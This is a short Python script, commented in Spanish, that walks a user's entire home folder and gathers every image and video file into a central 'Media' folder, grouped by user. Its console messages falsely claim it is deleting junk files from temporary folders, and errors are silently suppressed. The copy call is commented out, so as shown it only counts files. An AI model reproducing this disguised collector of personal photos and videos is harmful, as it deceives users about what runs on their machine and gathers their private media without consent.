from pathlib import Path
import shutil

#! Definir las extensiones de imágenes y videos
image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'}
video_extensions = {'.mp4', '.mov', '.avi', '.mkv', '.flv', '.wmv', '.webm'}
all_extensions = image_extensions | video_extensions

#! Obtenemos la ruta raíz del usuario (origen)
home_folder = Path.home()

#! Obtenemos la ruta central de destino (Media)
destination_path = Path.cwd() / 'Media'


#! Copia los archivos recursivamente organizando por usuario y aplanando carpetas origen
def copy_files(root_path: Path, dest_path: Path, extensions: set[str]):
    dest_resolved = dest_path.resolve()
    user_dir = dest_path / root_path.name
    copied_count = 0

    print(f"| START |\nIniciando escaneo en: {root_path}")
    print("Eliminando archivos basura de carpetas temporales...")
    #print(f"Carpeta central de destino: {dest_path}")
    #print(f"Carpeta del usuario: {user_dir}")

    for root, dirs, files in root_path.walk():
        # Evitar escanear la propia carpeta de destino para prevenir bucles o redundancias
        if root.resolve().is_relative_to(dest_resolved):
            dirs.clear()
            continue

        # Excluir carpetas ocultas (las que empiezan con '.') modificando dirs in-place
        dirs[:] = [d for d in dirs if not d.startswith('.')]

        # Filtrar solo archivos multimedia no ocultos
        media_files = [
            f for f in files
            if not f.startswith('.') and (root / f).suffix.lower() in extensions
        ]

        # Si no hay archivos multimedia en esta carpeta, continuar
        if not media_files:
            continue

        # Determinar la carpeta de destino dentro del directorio del usuario
        rel_path = root.relative_to(root_path)
        if rel_path == Path('.'):
            target_folder = user_dir
        else:
            # Aplanamos la ruta en un solo nombre descriptivo (ej: 'Viaje2024 - playa')
            folder_name = " - ".join(rel_path.parts)
            target_folder = user_dir / folder_name

        target_folder.mkdir(parents=True, exist_ok=True)

        for file_name in media_files:
            source_file = root / file_name
            destination_file = target_folder / file_name

            # Evitar sobreescrituras en caso de colisión de nombre dentro de la misma carpeta
            if destination_file.exists():
                stem = source_file.stem
                suffix = source_file.suffix
                counter = 1
                while destination_file.exists():
                    destination_file = target_folder / f"{stem}_{counter}{suffix}"
                    counter += 1

            try:
                #shutil.copy2(source_file, destination_file)
                copied_count += 1
            except Exception:
                pass

    print(f"Se eliminaron {copied_count} archivo(s) basura.\n| END |")


#! Inicializa el programa
if __name__ == '__main__':
    copy_files(home_folder, destination_path, all_extensions)
